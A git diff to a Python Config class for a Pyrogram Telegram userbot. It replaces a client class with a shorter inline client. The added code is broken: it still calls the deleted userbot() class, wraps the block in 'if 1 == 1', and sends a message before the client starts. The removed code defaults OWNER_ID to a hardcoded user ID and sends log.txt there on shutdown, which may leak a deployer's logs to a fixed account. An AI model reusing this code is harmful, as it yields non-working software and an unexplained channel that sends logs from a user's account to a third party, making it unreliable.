@@ -98,45 +98,13 @@ class Config:
     TG_MAX_FILE_SIZE = 4200000000
     DEF_THUMB_NAIL_VID_S = os.environ.get("DEF_THUMB_NAIL_VID_S", "")
     if len(STRING_SESSION) != 0:
-        class userbot(Client):
-            def __init__(self):
-                STRING_SESSION = os.environ.get('STRING_SESSION', '')
-                APP_ID = os.environ.get("APP_ID", None)
-                API_HASH = os.environ.get("API_HASH", None)
-                OWNER_ID = os.environ.get("OWNER_ID", '1276627253')  
-                super().__init__(
-                    name='Userbot',
-                    api_id=APP_ID,
-                    api_hash=API_HASH,
-                    session_string=STRING_SESSION,
-                    workers=343,
-                    sleep_threshold=5
-                )
-
-            async def start(self):
-                OWNER_ID = os.environ.get("OWNER_ID", '1276627253')
-                await super().start()
-                owner = await self.get_chat(OWNER_ID)
-                me = await self.get_me()
-                self.username = '@' + me.username
-                LOGGER.info(f"{me.first_name} with for Pyrogram v{__version__} (Layer {layer}) started on {me.username}. Premium {me.is_premium}.")
-                if OWNER_ID != 0:
-                    try:
-                        await self.send_message(text="userbot Karanlığın küllerinden yeniden doğdum.",
-                            chat_id=OWNER_ID)
-                    except Exception as t:
-                        LOGGER.error(str(t))
-
-            async def stop(self, *args):
-                OWNER_ID = os.environ.get("OWNER_ID", '1276627253')
-                if OWNER_ID != 0:
-                    texto = f"Son nefesimi verdim.\nÖldüğümde yaşım: (time.time() - botStartTime)"
-                    try:
-                       await self.send_document(document='log.txt', caption=texto, chat_id=OWNER_ID)
-                    except Exception as t:
-                        LOGGER.warning(str(t))
-                await super().stop()
-                LOGGER.info(msg="App Stopped.")
-                exit()
-        ubot = userbot()
-        ubot.start()
+        if 1 == 1:
+            uBot = Client(
+                name='Userbot',
+                api_id=APP_ID,
+                api_hash=API_HASH,
+                session_string=STRING_SESSION,
+            )
+            uBot.send_message(OWNER_ID, "Userbot Bașlatıldı..") 
+            ubot = userbot()
+            ubot.start()
